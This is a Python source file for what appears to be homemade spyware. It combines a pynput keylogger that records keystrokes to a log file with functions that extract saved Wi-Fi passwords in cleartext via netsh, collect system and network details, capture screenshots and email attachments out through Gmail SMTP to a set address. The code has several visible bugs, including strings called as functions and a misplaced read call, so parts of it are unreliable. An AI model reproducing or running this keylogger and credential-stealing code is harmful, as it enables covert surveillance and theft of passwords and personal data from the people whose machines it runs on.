#Libraries
import pynput
import smtplib
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import pyscreenshot as screenCapture
import socket
import os.path
import time
import subprocess

count = 0
keys = []
seconds = time.time()
email_user = ' '
email_send = ' '
email_password = ' '
subject = ' '
save_path = "/Users/Default/Roaming/"
system_information = os.path.join(save_path, "sysInfo.txt")
screenshot = os.path.join(save_path, "screenshot.png")
wifiInfo = os.path.join(save_path, "Wifi_Passswords.png")

def get_wifiInfo():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f = open(wifiInfo, "a")
            f.write("{:<10}: {:<}\n".format(i, results[0]))
            f.close()
        except IndexError:
            f = open(wifiInfo, "a")
            f.write("{:<10}: {:<}\n".format(i, ""))
            f.close()


def get_sysInfomation():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    ModelInfo = subprocess.check_output(["WMIC", "CSPRODUCT"]).decode('utf-8')
    WirelessInfo = subprocess.check_output(["ipconfig"]).decode('utf-8')

    f = open(system_information, "a")
    f.write("OS:" + platform.system())
    f.write(" " + platform.version() + "\n")
    f.write("Machine: " + platform.machine() + "\n")
    f.write("Hostname: " + hostname + "\n")
    f.write("IP Address:: " + IPAddr + "\n")
    f.write("Processor Information:" + platform.processor() + "\n")
    f.write("Manufacturer Information" + "\n" + ModelInfo())
    f.write(WirelessInfo())
    f.close()

def get_screenshot():
    img = screenCapture.grab()
    img.save(screenshot)

def sendEmail(filename, file):
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    date = subprocess.check_output(["date"]).decode('utf-8')
    msg['Subject'] = subject + date

    body = "View attached files."
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment).read()
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "Attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)
    server.sendmail(email_user, email_send, text)
    server.quit

def on_press(key):
    global keys, count
    keys.append(key)
    count+= 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        log_keys(keys)
        key = []

def log_keys(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    pass

with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()